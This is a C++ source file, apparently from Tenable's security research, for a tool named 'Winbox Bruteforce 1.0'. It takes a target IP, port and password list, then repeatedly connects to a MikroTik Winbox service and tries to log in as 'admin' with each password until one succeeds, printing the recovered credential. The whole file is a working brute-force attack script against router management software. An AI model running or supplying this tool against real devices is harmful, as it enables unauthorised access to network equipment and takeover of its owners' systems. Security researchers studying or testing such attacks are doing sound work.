/*
    Copyright 2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <fstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "Winbox Bruteforce 1.0";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_ip, std::string& p_port, std::string& p_password_file)
    {
        boost::program_options::options_description description("options");
        description.add_options()
            ("help,h", "A list of command line options")
            ("version,v", "Display version information")
            ("file,f", boost::program_options::value<std::string>(), "A password list")
            ("ip,i", boost::program_options::value<std::string>(), "The ip to connect to")
            ("port,p", boost::program_options::value<std::string>(), "The port to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("ip") && argv_map.count("port") && argv_map.count("file"))
        {
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_port.assign(argv_map["port"].as<std::string>());
            p_password_file.assign(argv_map["file"].as<std::string>());
            return true;
        }
        else
        {
            std::cout << description << std::endl;
        }

        return false;
    }
}

int main(int p_argc, const char** p_argv)
{
    std::string ip;
    std::string port;
    std::string password_file;
    if (!parseCommandLine(p_argc, p_argv, ip, port, password_file))
    {
        return EXIT_FAILURE;
    }

    std::cout << "[+] Loading password file..." << std::endl;
    std::ifstream passwords(password_file);
    if (!passwords.is_open())
    {
        std::cerr << "Couldn't open the passwords file." << std::endl;
        return EXIT_FAILURE;
    }

    std::size_t password_count = std::count(std::istreambuf_iterator<char>(passwords), std::istreambuf_iterator<char>(), '\n');
    std::cout << "[+] Found " << password_count << " passwords." << std::endl;

    passwords.clear();
    passwords.seekg(0, std::ios::beg);
    
    bool found = false;
    std::string password;
    for (std::size_t count = 1; !found && std::getline(passwords, password); count++)
    {
        std::cout << "\r" << count << " / " << password_count << std::flush;

        Winbox_Session winboxSession(ip, port);
        if (!winboxSession.connect())
        {
            std::cerr << std::endl << "Failed to connect to the remote host" << std::endl;
            return EXIT_FAILURE;
        }

        boost::uint32_t p_session_id = 0;
        if (!winboxSession.login("admin", password, p_session_id))
        {
            continue;
        }

        found = true;
    }
    passwords.close();

    std::cout << std::endl;
    if (found)
    {
        std::cout << "We found the password! Use admin:" << password << std::endl;
        return EXIT_SUCCESS;
    }
    else
    {
        std::cout << "We didn't find the password :(" << std::endl;
    }

    return EXIT_FAILURE;
}
